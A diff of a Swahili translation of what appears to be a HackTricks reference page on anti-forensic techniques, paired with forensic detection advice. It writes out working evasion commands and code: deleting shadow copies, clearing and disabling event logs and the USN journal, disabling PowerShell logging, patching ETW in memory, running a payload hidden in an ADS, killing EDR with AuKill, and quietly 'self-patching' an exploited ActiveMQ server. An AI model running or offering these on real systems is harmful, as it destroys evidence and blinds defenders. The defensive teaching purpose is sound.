@@ -1,164 +1,164 @@
-# Mbinu za Anti-Forensic
+# Anti-Forensic Techniques
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Wakati
+## Timestamps
 
-Mshambuliaji anaweza kuwa na hamu ya **kubadilisha wakati wa faili** ili kuepuka kugunduliwa.\
-Inawezekana kupata wakati ndani ya MFT katika sifa `$STANDARD_INFORMATION` \_\_ na \_\_ `$FILE_NAME`.
+Mshambulizi anaweza kupendezwa na **kubadilisha timestamps za files** ili kuepuka kugunduliwa.\
+Inawezekana kupata timestamps ndani ya MFT katika attributes `$STANDARD_INFORMATION` \_\_ na \_\_ `$FILE_NAME`.
 
-Sifa zote zina nyakati 4: **Mabadiliko**, **ufikiaji**, **kuundwa**, na **mabadiliko ya rejista ya MFT** (MACE au MACB).
+Attributes zote mbili zina timestamps 4: **Modification**, **access**, **creation**, na **MFT registry modification** (MACE au MACB).
 
-**Windows explorer** na zana nyingine zinaonyesha taarifa kutoka **`$STANDARD_INFORMATION`**.
+**Windows explorer** na tools nyingine huonyesha taarifa kutoka **`$STANDARD_INFORMATION`**.
 
-### TimeStomp - Zana ya Anti-forensic
+### TimeStomp - Anti-forensic Tool
 
-Zana hii **inabadilisha** taarifa za wakati ndani ya **`$STANDARD_INFORMATION`** **lakini** **sio** taarifa ndani ya **`$FILE_NAME`**. Hivyo, inawezekana **kutambua** **shughuli** **za shaka**.
+Tool hii **hubadilisha** taarifa za timestamp ndani ya **`$STANDARD_INFORMATION`** **lakini si** taarifa zilizo ndani ya **`$FILE_NAME`**. Kwa hiyo, inawezekana **kutambua** shughuli **zenye mashaka**.
 
 ### Usnjrnl
 
-**USN Journal** (Jarida la Nambari ya Mabadiliko) ni kipengele cha NTFS (mfumo wa faili wa Windows NT) kinachofuatilia mabadiliko ya kiasi. Zana ya [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) inaruhusu uchambuzi wa mabadiliko haya.
+**USN Journal** (Update Sequence Number Journal) ni feature ya NTFS (Windows NT file system) inayofuatilia mabadiliko ya volume. Tool ya [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) inaruhusu kuchunguza mabadiliko haya.
 
-![](<../../images/image (801).png>)
+![TimeStomp - Anti-forensic Tool - Usnjrnl: USN Journal (Update Sequence Number Journal) ni feature ya NTFS (Windows NT file system) inayofuatilia mabadiliko ya volume. ...](<../../images/image (801).png>)
 
-Picha ya awali ni **matokeo** yanayoonyeshwa na **zana** ambapo inaonekana kuwa baadhi ya **mabadiliko yalifanywa** kwa faili.
+Picha iliyotangulia ni **output** iliyoonyeshwa na **tool**, ambapo inaweza kuonekana kuwa **mabadiliko fulani yalifanywa** kwenye file.
 
 ### $LogFile
 
-**Mabadiliko yote ya metadata kwa mfumo wa faili yanarekodiwa** katika mchakato unaojulikana kama [kuandika kabla ya kuandika](https://en.wikipedia.org/wiki/Write-ahead_logging). Metadata iliyorekodiwa inahifadhiwa katika faili inayoitwa `**$LogFile**`, iliyoko katika saraka ya mzizi ya mfumo wa faili wa NTFS. Zana kama [LogFileParser](https://github.com/jschicht/LogFileParser) zinaweza kutumika kuchambua faili hii na kutambua mabadiliko.
+**Mabadiliko yote ya metadata kwenye file system huwekwa kwenye log** katika mchakato unaojulikana kama [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Metadata iliyowekwa kwenye log huhifadhiwa katika file linaloitwa `**$LogFile**`, lililoko kwenye root directory ya NTFS file system. Tools kama [LogFileParser](https://github.com/jschicht/LogFileParser) zinaweza kutumika ku-parse file hili na kutambua mabadiliko.
 
-![](<../../images/image (137).png>)
+![Usnjrnl - $LogFile: Mabadiliko yote ya metadata kwenye file system huwekwa kwenye log katika mchakato unaojulikana kama write-ahead logging. Metadata iliyowekwa kwenye log huhifadhiwa katika file linaloitwa $LogFile, lililoko kwenye root...](<../../images/image (137).png>)
 
-Tena, katika matokeo ya zana inawezekana kuona kuwa **baadhi ya mabadiliko yalifanywa**.
+Tena, katika output ya tool inawezekana kuona kuwa **mabadiliko fulani yalifanywa**.
 
-Kwa kutumia zana hiyo hiyo inawezekana kutambua **wakati ambao nyakati ziliporomoshwa**:
+Kwa kutumia tool hiyo hiyo inawezekana kutambua **timestamps zilibadilishwa wakati gani**:
 
-![](<../../images/image (1089).png>)
+![Usnjrnl - $LogFile: Kwa kutumia tool hiyo hiyo inawezekana kutambua timestamps zilibadilishwa wakati gani](<../../images/image (1089).png>)
 
-- CTIME: Wakati wa kuundwa wa faili
-- ATIME: Wakati wa mabadiliko ya faili
-- MTIME: Mabadiliko ya rejista ya MFT ya faili
-- RTIME: Wakati wa ufikiaji wa faili
+- CTIME: Muda wa kuundwa kwa file
+- ATIME: Muda wa modification wa file
+- MTIME: Muda wa modification wa MFT registry ya file
+- RTIME: Muda wa access wa file
 
 ### Ulinganisho wa `$STANDARD_INFORMATION` na `$FILE_NAME`
 
-Njia nyingine ya kutambua faili za shaka zilizobadilishwa ingekuwa kulinganisha wakati kwenye sifa zote mbili kutafuta **mismatch**.
+Njia nyingine ya kutambua files zilizobadilishwa kwa mashaka ni kulinganisha muda katika attributes zote mbili na kutafuta **mismatches**.
 
 ### Nanoseconds
 
-**Nyakati za NTFS** zina **usahihi** wa **nanosekondi 100**. Hivyo, kupata faili zikiwa na nyakati kama 2010-10-10 10:10:**00.000:0000 ni ya kushangaza sana**.
+Timestamps za **NTFS** zina **precision** ya **nanoseconds 100**. Kwa hiyo, kupata files zenye timestamps kama 2010-10-10 10:10:**00.000:0000 kunatia mashaka sana**.
 
-### SetMace - Zana ya Anti-forensic
+### SetMace - Anti-forensic Tool
 
-Zana hii inaweza kubadilisha sifa zote mbili `$STARNDAR_INFORMATION` na `$FILE_NAME`. Hata hivyo, kuanzia Windows Vista, ni lazima kwa OS hai kubadilisha taarifa hii.
+Tool hii inaweza kubadilisha attributes zote mbili `$STARNDAR_INFORMATION` na `$FILE_NAME`. Hata hivyo, kuanzia Windows Vista, live OS inahitajika ili kubadilisha taarifa hizi.
 
-## Kuficha Data
+## Data Hiding
 
-NFTS inatumia klasta na ukubwa wa habari wa chini. Hii inamaanisha kwamba ikiwa faili inachukua klasta na nusu, **nusu iliyobaki haitatumika kamwe** hadi faili itakapofutwa. Hivyo, inawezekana **kuficha data katika nafasi hii ya slack**.
+NFTS hutumia cluster na kiwango cha chini cha ukubwa wa taarifa. Hii inamaanisha kuwa ikiwa file linatumia cluster moja na nusu, **nusu iliyobaki haitatumika kamwe** hadi file lifutwe. Kwa hiyo, inawezekana **kuficha data katika slack space hii**.
 
-Kuna zana kama slacker zinazoruhusu kuficha data katika nafasi hii "iliyojificha". Hata hivyo, uchambuzi wa `$logfile` na `$usnjrnl` unaweza kuonyesha kuwa baadhi ya data iliongezwa:
+Kuna tools kama slacker zinazoruhusu kuficha data katika space hii "iliyofichwa". Hata hivyo, uchambuzi wa `$logfile` na `$usnjrnl` unaweza kuonyesha kuwa data fulani iliongezwa:
 
-![](<../../images/image (1060).png>)
+![SetMace - Anti-forensic Tool - Data Hiding: Kuna tools kama slacker zinazoruhusu kuficha data katika space hii "iliyofichwa". Hata hivyo, uchambuzi wa $logfile na $usnjrnl unaweza kuonyesha kuwa...](<../../images/image (1060).png>)
 
-Hivyo, inawezekana kurejesha nafasi ya slack kwa kutumia zana kama FTK Imager. Kumbuka kuwa aina hii ya zana inaweza kuhifadhi maudhui yaliyofichwa au hata yaliyosimbwa.
+Kisha, inawezekana kuretrieve slack space kwa kutumia tools kama FTK Imager. Kumbuka kuwa aina hii ya tool inaweza kuhifadhi content ikiwa ime-obfuscate au hata ikiwa encrypted.
 
 ## UsbKill
 
-Hii ni zana ambayo it **izima kompyuta ikiwa mabadiliko yoyote katika USB** bandari yanagundulika.\
-Njia moja ya kugundua hii ingekuwa kuchunguza michakato inayoendesha na **kurejea kila script ya python inayotembea**.
+Hii ni tool ambayo **itazima computer ikiwa mabadiliko yoyote kwenye** ports za **USB** yatagunduliwa.\
+Njia moja ya kugundua hii ni kukagua processes zinazoendesha na **ku-review kila Python script inayoendesha**.
 
-## Usambazaji wa Live Linux
+## Live Linux Distributions
 
-Hizi distros zina **tekelezwa ndani ya RAM** kumbukumbu. Njia pekee ya kuzitambua ni **ikiwa mfumo wa faili wa NTFS umewekwa na ruhusa za kuandika**. Ikiwa umewekwa tu na ruhusa za kusoma haitakuwa rahisi kugundua uvamizi.
+Distros hizi **huendeshwa ndani ya** memory ya **RAM**. Njia pekee ya kuzitambua ni **ikiwa NTFS file-system ime-mountiwa kwa write permissions**. Ikiwa ime-mountiwa kwa read permissions pekee, haitawezekana kutambua intrusion.
 
-## Kufuta Salama
+## Secure Deletion
 
 [https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)
 
-## Mipangilio ya Windows
+## Windows Configuration
 
-Inawezekana kuzima mbinu kadhaa za kurekodi za windows ili kufanya uchunguzi wa forensics kuwa mgumu zaidi.
+Inawezekana kuzima mbinu kadhaa za Windows logging ili kufanya uchunguzi wa forensics kuwa mgumu zaidi.
 
-### Zima Wakati - UserAssist
+### Disable Timestamps - UserAssist
 
-Hii ni funguo ya rejista inayohifadhi tarehe na saa wakati kila executable ilipokimbizwa na mtumiaji.
+Hii ni registry key inayohifadhi tarehe na saa ambazo kila executable iliendeshwa na user.
 
 Kuzima UserAssist kunahitaji hatua mbili:
 
-1. Weka funguo mbili za rejista, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` na `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, zote kuwa sifuri ili kuashiria kwamba tunataka UserAssist izimwe.
-2. Futa subtrees zako za rejista zinazofanana na `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.
+1. Weka registry keys mbili, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` na `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, zote zikiwa zero ili kuashiria kuwa tunataka UserAssist izimwe.
+2. Futa registry subtrees zako zinazoonekana kama `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.
 
-### Zima Wakati - Prefetch
+### Disable Timestamps - Prefetch
 
-Hii itahifadhi taarifa kuhusu programu zilizotekelezwa kwa lengo la kuboresha utendaji wa mfumo wa Windows. Hata hivyo, hii inaweza pia kuwa muhimu kwa mazoea ya forensics.
+Hii huhifadhi taarifa kuhusu applications zilizoendeshwa kwa lengo la kuboresha performance ya Windows system. Hata hivyo, taarifa hizi zinaweza pia kuwa muhimu kwa forensic practices.
 
-- Tekeleza `regedit`
-- Chagua njia ya faili `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
-- Bonyeza kulia kwenye `EnablePrefetcher` na `EnableSuperfetch`
-- Chagua Badilisha kwenye kila moja ya hizi kubadilisha thamani kutoka 1 (au 3) hadi 0
-- Anzisha upya
+- Endesha `regedit`
+- Chagua file path `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
+- Bofya kulia kwenye `EnablePrefetcher` na `EnableSuperfetch`
+- Chagua Modify kwenye kila moja ili kubadilisha value kutoka 1 (au 3) kuwa 0
+- Restart
 
-### Zima Wakati - Wakati wa Mwisho wa Ufikiaji
+### Disable Timestamps - Last Access Time
 
-Wakati folder inafunguliwa kutoka kiasi cha NTFS kwenye seva ya Windows NT, mfumo unachukua wakati wa **kupdate uwanja wa wakati kwenye kila folder iliyoorodheshwa**, inayoitwa wakati wa mwisho wa ufikiaji. Katika kiasi cha NTFS kinachotumiwa sana, hii inaweza kuathiri utendaji.
+Kila folder inapofunguliwa kutoka NTFS volume kwenye Windows NT server, system huchukua muda wa **ku-update timestamp field kwenye kila folder iliyo kwenye list**, unaoitwa last access time. Kwenye NTFS volume inayotumika sana, hii inaweza kuathiri performance.
 
-1. Fungua Mhariri wa Rejista (Regedit.exe).
-2. Tembelea `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
-3. Tafuta `NtfsDisableLastAccessUpdate`. Ikiwa haipo, ongeza hii DWORD na weka thamani yake kuwa 1, ambayo itazima mchakato.
-4. Funga Mhariri wa Rejista, na upya seva.
+1. Fungua Registry Editor (Regedit.exe).
+2. Nenda kwenye `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
+3. Tafuta `NtfsDisableLastAccessUpdate`. Ikiwa haipo, ongeza DWORD hii na uweke value yake kuwa 1, ambayo itazima mchakato huo.
+4. Funga Registry Editor na u-reboot server.
 
-### Futa Historia ya USB
+### Delete USB History
 
-Makala yote ya **USB Device Entries** huhifadhiwa katika Rejista ya Windows Chini ya funguo ya **USBSTOR** ambayo ina funguo ndogo zinazoundwa kila wakati unapoingiza Kifaa cha USB kwenye PC au Laptop yako. Unaweza kupata funguo hii hapa `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Kufuta hii** utafuta historia ya USB.\
-Unaweza pia kutumia zana [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) kuhakikisha umekifuta (na kufuta).
+**USB Device Entries** zote huhifadhiwa kwenye Windows Registry chini ya registry key **USBSTOR**, yenye sub keys zinazoundwa kila unapounganisha USB Device kwenye PC au Laptop yako. Unaweza kupata key hii hapa `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Kuifuta** kutafuta USB history.\
+Unaweza pia kutumia tool ya [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) ili kuhakikisha kuwa umefuta entries hizo (na kuzifuta).
 
-Faili nyingine inayohifadhi taarifa kuhusu USB ni faili `setupapi.dev.log` ndani ya `C:\Windows\INF`. Hii pia inapaswa kufutwa.
+File nyingine inayohifadhi taarifa kuhusu USBs ni `setupapi.dev.log`, iliyoko ndani ya `C:\Windows\INF`. Hii pia inapaswa kufutwa.
 
-### Zima Nakala za Kivuli
+### Disable Shadow Copies
 
-**Orodha** ya nakala za kivuli na `vssadmin list shadowstorage`\
-**Futa** hizo ukikimbia `vssadmin delete shadow`
+**Orodhesha** shadow copies kwa `vssadmin list shadowstorage`\
+**Yafute** kwa kuendesha `vssadmin delete shadow`
 
-Unaweza pia kuzifuta kupitia GUI ukifuatia hatua zilizopendekezwa katika [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)
+Unaweza pia kuyafuta kupitia GUI kwa kufuata hatua zilizopendekezwa kwenye [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)
 
-Ili kuzima nakala za kivuli [hatua kutoka hapa](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):
+Ili kuzima shadow copies [steps kutoka hapa](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):
 
-1. Fungua programu za Huduma kwa kuandika "services" kwenye kisanduku cha kutafuta maandiko baada ya kubonyeza kitufe cha kuanzisha cha Windows.
-2. Kutoka kwenye orodha, pata "Volume Shadow Copy", chagua, kisha upate Mali kwa kubonyeza kulia.
-3. Chagua Zime kutoka kwenye orodha ya "Aina ya Kuanzisha", kisha thibitisha mabadiliko kwa kubonyeza Tumia na Sawa.
+1. Fungua Services program kwa kuandika "services" kwenye text search box baada ya kubofya Windows start button.
+2. Kwenye list, tafuta "Volume Shadow Copy", ichague, kisha fungua Properties kwa kubofya kulia.
+3. Chagua Disabled kwenye "Startup type" drop-down menu, kisha thibitisha mabadiliko kwa kubofya Apply na OK.
 
-Pia inawezekana kubadilisha mipangilio ya faili zipi zitakazokopwa katika nakala ya kivuli katika rejista `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`
+Pia inawezekana kubadilisha configuration ya files zitakazonakiliwa katika shadow copy kwenye registry `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`
 
-### Andika tena faili zilizofutwa
+### Overwrite deleted files
 
-- Unaweza kutumia **zana ya Windows**: `cipher /w:C` Hii itamwambia cipher kuondoa data yoyote kutoka kwa nafasi isiyotumika ya diski ndani ya diski ya C.
-- Unaweza pia kutumia zana kama [**Eraser**](https://eraser.heidi.ie)
+- Unaweza kutumia **Windows tool**: `cipher /w:C`. Hii itaamuru cipher kuondoa data yoyote kutoka kwenye disk space isiyotumika inayopatikana ndani ya C drive.
+- Unaweza pia kutumia tools kama [**Eraser**](https://eraser.heidi.ie)
 
-### Futa kumbukumbu za matukio ya Windows
+### Delete Windows event logs
 
-- Windows + R --> eventvwr.msc --> Panua "Kumbukumbu za Windows" --> Bonyeza kulia kila kikundi na chagua "Futa Kumbukumbu"
+- Windows + R --> eventvwr.msc --> Panua "Windows Logs" --> Bofya kulia kila category na uchague "Clear Log"
 - `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
 - `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`
 
-### Zima kumbukumbu za matukio ya Windows
+### Disable Windows event logs
 
 - `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
-- Ndani ya sehemu za huduma zima huduma "Windows Event Log"
+- Ndani ya services section zima service "Windows Event Log"
 - `WEvtUtil.exec clear-log` au `WEvtUtil.exe cl`
 
-### Zima $UsnJrnl
+### Disable $UsnJrnl
 
 - `fsutil usn deletejournal /d c:`
 
 ---
 
-## Kurekodi na Kudanganya Alama za Juu (2023-2025)
+## Advanced Logging & Trace Tampering (2023-2025)
 
-### Kurekodi ScriptBlock/Module ya PowerShell
+### PowerShell ScriptBlock/Module Logging
 
-Matoleo ya hivi karibuni ya Windows 10/11 na Windows Server yana **vitu vya forensics vya PowerShell** chini ya
-`Microsoft-Windows-PowerShell/Operational` (matukio 4104/4105/4106).
-Mshambuliaji anaweza kuzima au kufuta kwa haraka:
+Versions za hivi karibuni za Windows 10/11 na Windows Server huhifadhi **PowerShell forensic artifacts nyingi** chini ya
+`Microsoft-Windows-PowerShell/Operational` (events 4104/4105/4106).
+Attackers wanaweza kuzima au kuzifuta wakati huo huo:
 ```powershell
 # Turn OFF ScriptBlock & Module logging (registry persistence)
 New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
@@ -170,11 +170,13 @@ New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShel
 Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
 Remove-WinEvent               # requires admin & Win11 23H2+
 ```
-Walinda wanapaswa kufuatilia mabadiliko kwenye funguo hizo za rejista na kuondolewa kwa wingi kwa matukio ya PowerShell.
+Defenders wanapaswa kufuatilia mabadiliko kwenye registry keys hizo na uondoaji wa kiwango cha juu wa PowerShell events.
 
 ### ETW (Event Tracing for Windows) Patch
 
-Bidhaa za usalama wa mwisho zinategemea sana ETW. Njia maarufu ya kuepuka mwaka wa 2024 ni kupachika `ntdll!EtwEventWrite`/`EtwEventWriteFull` kwenye kumbukumbu ili kila wito wa ETW urudishe `STATUS_SUCCESS` bila kutoa tukio:
+Endpoint security products hutegemea sana ETW. Njia maarufu ya evasion ya 2024 ni
+kupatch `ntdll!EtwEventWrite`/`EtwEventWriteFull` kwenye memory ili kila mwito wa ETW urudishe `STATUS_SUCCESS`
+bila kutoa tukio:
 ```c
 // 0xC3 = RET on x64
 unsigned char patch[1] = { 0xC3 };
@@ -182,44 +184,49 @@ WriteProcessMemory(GetCurrentProcess(),
 GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
 patch, sizeof(patch), NULL);
 ```
-Public PoCs (e.g. `EtwTiSwallow`) implement the same primitive in PowerShell or C++.
-Kwa sababu ya patch ni **process-local**, EDRs zinazotembea ndani ya michakato mingine zinaweza kukosa hiyo.
-Uchunguzi: linganisha `ntdll` katika kumbukumbu dhidi ya kwenye diski, au hook kabla ya user-mode.
+Public PoCs (k.m. `EtwTiSwallow`) hutekeleza primitive ileile katika PowerShell au C++.
+Kwa sababu patch ni **process-local**, EDR zinazoendesha ndani ya processes nyingine huenda zisisaidie kuigundua.
+Detection: linganisha `ntdll` iliyo kwenye memory na iliyo kwenye disk, au weka hook kabla ya user-mode.
 
-### Ufuatiliaji wa Data Mbadala (ADS) Urejeleaji
+### Ufufuaji wa Alternate Data Streams (ADS)
 
-Kampeni za malware mwaka wa 2023 (e.g. **FIN12** loaders) zimeonekana zikifanya staging binaries za hatua ya pili ndani ya ADS ili kubaki nje ya mtazamo wa scanners za jadi:
+Malware campaigns za 2023 (k.m. **FIN12** loaders) zimeonekana ziki-stage second-stage binaries
+ndani ya ADS ili zisigunduliwe na traditional scanners:
 ```cmd
 rem Hide cobalt.bin inside an ADS of a PDF
 type cobalt.bin > report.pdf:win32res.dll
 rem Execute directly
 wmic process call create "cmd /c report.pdf:win32res.dll"
 ```
-Enumerate streams with `dir /R`, `Get-Item -Stream *`, or Sysinternals `streams64.exe`. Copying the host file to FAT/exFAT or via SMB will strip the hidden stream and can be used by investigators to recover the payload.
+Orodhesha streams kwa kutumia `dir /R`, `Get-Item -Stream *`, au Sysinternals `streams64.exe`.
+Kunakili faili mwenyeji kwenda FAT/exFAT au kupitia SMB kutaondoa stream iliyofichwa na kunaweza
+kutumiwa na wachunguzi kurejesha payload.
 
 ### BYOVD & “AuKill” (2023)
 
-Bring-Your-Own-Vulnerable-Driver sasa inatumika mara kwa mara kwa **anti-forensics** katika uvamizi wa ransomware. Zana ya chanzo wazi **AuKill** inachukua dereva ulio saini lakini una udhaifu (`procexp152.sys`) ili kusimamisha au kumaliza EDR na sensorer za forensics **kabla ya usimbaji na uharibifu wa kumbukumbu**:
+Bring-Your-Own-Vulnerable-Driver sasa hutumiwa mara kwa mara kwa **anti-forensics** katika uvamizi wa ransomware.
+Zana ya open-source **AuKill** hupakia driver iliyosainiwa lakini iliyo katika hatari za kiusalama (`procexp152.sys`) ili
+kusimamisha au kukatisha EDR na forensic sensors **kabla ya encryption na uharibifu wa log**:<sup>[[1]](#references)</sup>
 ```cmd
 AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
 AuKill.exe -k CrowdStrike
 ```
-Driver inatolewa baadaye, ikiacha artefacts chache.
-Mikakati: wezesha orodha ya kuzuia madereva hatarishi ya Microsoft (HVCI/SAC),
-na onya juu ya uundaji wa huduma za kernel kutoka kwa njia zinazoweza kuandikwa na mtumiaji.
+Driver huondolewa baadaye, na kuacha artifacts chache sana.<sup>[[1]](#references)</sup>  
+Hatua za kupunguza athari: wezesha Microsoft vulnerable-driver blocklist (HVCI/SAC),  
+na toa alert kuhusu uundaji wa kernel-service kutoka kwenye paths zinazoweza kuandikwa na mtumiaji.
 
 ---
 
-## Linux Anti-Forensics: Kujipatia Kijisafisha na Cloud C2 (2023–2025)
+## Linux Anti-Forensics: Self-Patching na Cloud C2 (2023–2025)
 
-### Kujipatia Kijisafisha huduma zilizovunjwa ili kupunguza kugundulika (Linux)
-Wadadisi wanajitahidi "kujipatia kijisafisha" huduma mara tu baada ya kuikandamiza ili kuzuia tena kuikandamiza na kukandamiza kugundulika kwa msingi wa udhaifu. Wazo ni kubadilisha vipengele vyenye udhaifu na binaries/JARs halali za juu zaidi, ili skana ziweze kuripoti mwenyeji kama amepatiwa kijisafisha wakati uvumilivu na C2 vinabaki.
+### Self-patching services zilizoathiriwa ili kupunguza detection (Linux)
+Adversaries wanazidi kutumia “self-patch” kwenye service mara tu baada ya kui-exploit, ili kuzuia re-exploitation na kukandamiza detections zinazotegemea vulnerabilities. Wazo ni kubadilisha components zilizo hatarini kwa upstream binaries/JARs halali na za hivi karibuni, ili scanners ziripoti host kuwa imepatchiwa huku persistence na C2 vikiendelea.<sup>[[3]](#references)</sup>
 
-Mfano: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)
-- Baada ya kuikandamiza, washambuliaji walipata JARs halali kutoka Maven Central (repo1.maven.org), wakafuta JARs zenye udhaifu katika usakinishaji wa ActiveMQ, na kuanzisha tena broker.
-- Hii ilifunga RCE ya awali huku ikihifadhi maeneo mengine (cron, mabadiliko ya usanidi wa SSH, vipandikizi vya C2 tofauti).
+Mfano: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)<sup>[[3]](#references)[[4]](#references)</sup>
+- Baada ya Post-exploitation, attackers walichukua JARs halali kutoka Maven Central (repo1.maven.org), wakafuta JARs zilizo hatarini kwenye installation ya ActiveMQ, kisha wakarestart broker.
+- Hii ilifunga RCE ya awali huku ikidumisha footholds nyingine (cron, mabadiliko ya SSH config, na C2 implants tofauti).
 
-Mfano wa operesheni (kuonyesha)
+Mfano wa kiutendaji (wa kielelezo)
 ```bash
 # ActiveMQ install root (adjust as needed)
 AMQ_DIR=/opt/activemq
@@ -237,61 +244,57 @@ ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar
 # Apply changes without removing persistence
 systemctl restart activemq || service activemq restart
 ```
-Forensic/hunting tips
-- Kagua huduma za directories kwa ajili ya kubadilisha binary/JAR zisizopangwa:
-- Debian/Ubuntu: `dpkg -V activemq` na kulinganisha hash za faili/paths na repo mirrors.
-- RHEL/CentOS: `rpm -Va 'activemq*'`
-- Tafuta toleo za JAR zilizopo kwenye diski ambazo hazimilikiwi na meneja wa pakiti, au viungo vya alama vilivyosasishwa nje ya muktadha.
-- Timeline: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` ili kuhusisha ctime/mtime na dirisha la kuathiriwa.
-- Historia ya shell/telemetry ya mchakato: ushahidi wa `curl`/`wget` kwa `repo1.maven.org` au CDNs nyingine za artefacts mara tu baada ya unyakuzi wa awali.
-- Usimamizi wa mabadiliko: thibitisha ni nani aliyeweka “patch” na kwa nini, si tu kwamba toleo lililosasishwa lipo.
+Vidokezo vya Forensic/hunting
+- Kagua directories za services kwa replacements za binary/JAR ambazo hazikupangwa:
+- Debian/Ubuntu: `dpkg -V activemq` na linganisha file hashes/paths na repo mirrors.
+- Tafuta matoleo ya JAR yaliyopo kwenye disk ambayo hayamilikiwi na package manager, au symbolic links zilizosasishwa nje ya utaratibu rasmi.
+- Timeline: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` ili kuhusianisha ctime/mtime na muda wa compromise.
+- Shell history/process telemetry: ushahidi wa `curl`/`wget` kwenda `repo1.maven.org` au artifact CDN nyingine mara tu baada ya initial exploitation.
+- Change management: thibitisha ni nani aliyetumia “patch” na kwa nini, si kwamba patched version ipo tu.
 
-### Cloud‑service C2 with bearer tokens and anti‑analysis stagers
-Uchunguzi wa biashara ulionyesha njia nyingi za C2 za muda mrefu na ufungaji wa kupambana na uchambuzi:
-- Wasilishi wa PyInstaller ELF walio na nenosiri ili kuzuia sanduku la mchanga na uchambuzi wa statiki (mfano, PYZ iliyosimbwa, utoaji wa muda mfupi chini ya `/_MEI*`).
-- Viashiria: `strings` hits kama `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
-- Artefacts za wakati wa kukimbia: utoaji kwa `/tmp/_MEI*` au njia za `--runtime-tmpdir` za kawaida.
-- C2 inayotegemea Dropbox ikitumia tokens za OAuth Bearer zilizowekwa kwa nguvu
-- Alama za mtandao: `api.dropboxapi.com` / `content.dropboxapi.com` zikiwa na `Authorization: Bearer <token>`.
-- Tafuta katika proxy/NetFlow/Zeek/Suricata kwa HTTPS ya nje kwa maeneo ya Dropbox kutoka kwa kazi za seva ambazo kawaida hazisawazishi faili.
-- C2 ya sambamba/ya akiba kupitia tunneling (mfano, Cloudflare Tunnel `cloudflared`), ikihifadhi udhibiti ikiwa channel moja imezuiwa.
-- IOCs za mwenyeji: michakato/units za `cloudflared`, config katika `~/.cloudflared/*.json`, outbound 443 kwa Cloudflare edges.
+### Cloud-service C2 yenye bearer tokens na anti-analysis stagers
+Tradecraft iliyozingatiwa ilichanganya njia nyingi za long-haul C2 na anti-analysis packaging:<sup>[[3]](#references)</sup>
+- Password-protected PyInstaller ELF loaders za kuzuia sandboxing na static analysis (kwa mfano, encrypted PYZ, temporary extraction chini ya `/_MEI*`).
+- Indicators: `strings` hits kama `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
+- Runtime artifacts: extraction kwenda `/tmp/_MEI*` au paths maalum za `--runtime-tmpdir`.
+- Dropbox-backed C2 ikitumia hardcoded OAuth Bearer tokens
+- Network markers: `api.dropboxapi.com` / `content.dropboxapi.com` yenye `Authorization: Bearer <token>`.
+- Fanya hunting katika proxy/NetFlow/Zeek/Suricata kwa outbound HTTPS kwenda Dropbox domains kutoka server workloads ambazo kwa kawaida hazisync files.
+- Parallel/backup C2 kupitia tunneling (kwa mfano, Cloudflare Tunnel `cloudflared`), ili kudumisha control ikiwa channel moja imezuiwa.
+- Host IOCs: processes/units za `cloudflared`, config katika `~/.cloudflared/*.json`, outbound 443 kwenda Cloudflare edges.
 
-### Persistence and “hardening rollback” to maintain access (Linux examples)
